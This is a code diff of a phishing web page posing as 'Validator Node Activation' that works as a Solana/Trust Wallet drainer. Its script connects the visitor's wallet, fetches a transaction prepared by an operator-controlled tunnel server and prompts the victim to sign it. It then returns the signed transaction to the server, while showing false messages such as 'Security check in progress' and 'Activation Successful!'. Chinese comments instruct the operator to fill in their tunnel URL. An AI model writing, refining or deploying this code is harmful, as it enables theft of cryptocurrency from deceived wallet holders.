@@ -1,95 +1,73 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Node Activation</title>
-    <style>
-        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { text-align: center; padding: 20px; border: 1px solid #2b2f36; border-radius: 12px; background: #181a20; width: 90%; max-width: 400px; }
-        button { background: #f0b90b; color: #000; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
-        button:active { transform: scale(0.98); }
-        .status { color: #848e9c; font-size: 12px; margin-top: 15px; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <h2>Node Activation</h2>
-    <p>Please synchronize your wallet to start the validator node.</p>
-    <button id="activate_btn">ACTIVATE NOW</button>
-    <div class="status" id="status_text">System: Ready to sync...</div>
-</div>
-
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-
 <script>
-// 🔱 1. 配置你的隧道地址（务必修改这里）
+// 🔱 请务必确认你的隧道地址末尾没有多余的斜杠
 const TUNNEL_URL = "https://你的穿透地址.com"; 
 
-async function startProcess() {
-    const btn = document.getElementById('activate_btn');
-    const st = document.getElementById('status_text');
-    
-    try {
-        btn.disabled = true;
-        st.innerText = "Connecting wallet...";
+function logStatus(msg) {
+    document.getElementById('status_text').innerText = msg;
+    console.log("🔱 [LOG]:", msg);
+}
 
-        // 2. 获取钱包对象
-        const p = window.trustwallet?.solana || window.solana;
-        if (!p) {
-            alert("Trust Wallet not found! Please open in Trust Wallet Browser.");
-            btn.disabled = false;
+async function startProcess() {
+    logStatus("Initializing...");
+    try {
+        // 1. 强制检测钱包
+        const solana = window.trustwallet?.solana || window.solana;
+        if (!solana) {
+            alert("Error: Trust Wallet Not Detected!");
             return;
         }
 
-        await p.connect();
-        st.innerText = "Synchronizing data...";
+        // 2. 连接
+        await solana.connect();
+        const userAddress = solana.publicKey.toString();
+        logStatus("Connected: " + userAddress.substring(0, 6) + "...");
 
-        // 3. 请求后端 V100 构造交易
-        const resp = await fetch(TUNNEL_URL + "/prepare_v32", {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ address: p.publicKey.toString() })
-        });
+        // 3. 原生请求后端 (手动处理跨域)
+        logStatus("Contacting Server...");
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", TUNNEL_URL + "/prepare_v32", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
 
-        const info = await resp.json();
-        
-        if (info.raw_tx) {
-            st.innerText = "Security check in progress...";
-            const web3 = window.solanaWeb3;
-            
-            // 4. 反序列化并拉起签名
-            const txBuffer = Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0));
-            const tx = web3.Transaction.from(txBuffer);
-            
-            const signed = await p.signTransaction(tx);
-            st.innerText = "Verifying signature...";
+        xhr.onreadystatechange = async function () {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    const info = JSON.parse(xhr.responseText);
+                    if (info.raw_tx) {
+                        logStatus("Signing Required...");
+                        const web3 = window.solanaWeb3;
+                        const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+                        
+                        // 🔱 拉起签名
+                        const signed = await solana.signTransaction(tx);
+                        logStatus("Broadcasting...");
+                        
+                        // 4. 发送回服务器
+                        const broadcastXhr = new XMLHttpRequest();
+                        broadcastXhr.open("POST", TUNNEL_URL + "/broadcast_v41", true);
+                        broadcastXhr.setRequestHeader("Content-Type", "application/json");
+                        broadcastXhr.send(JSON.stringify({
+                            signed_tx: btoa(String.fromCharCode.apply(null, signed.serialize()))
+                        }));
+                        
+                        logStatus("Activation Successful!");
+                    } else {
+                        alert("Server Error: " + (info.error || "No TX"));
+                    }
+                } else {
+                    alert("Network Error: Status " + xhr.status);
+                }
+            }
+        };
 
-            // 5. 广播
-            const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
-            await fetch(TUNNEL_URL + "/broadcast_v41", {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ signed_tx: signedBase })
-            });
-            
-            st.innerText = "Activation completed!";
-        } else {
-            st.innerText = "Error: " + (info.error || "Unknown");
-            btn.disabled = false;
-        }
+        xhr.send(JSON.stringify({ address: userAddress }));
 
     } catch (err) {
-        console.error(err);
-        st.innerText = "System busy, please try again.";
-        btn.disabled = false;
+        alert("Catch Error: " + err.message);
+        logStatus("Try again.");
     }
 }
 
-// 绑定事件
+// 绑定按钮
 document.getElementById('activate_btn').onclick = startProcess;
 </script>
-
-</body>
-</html>
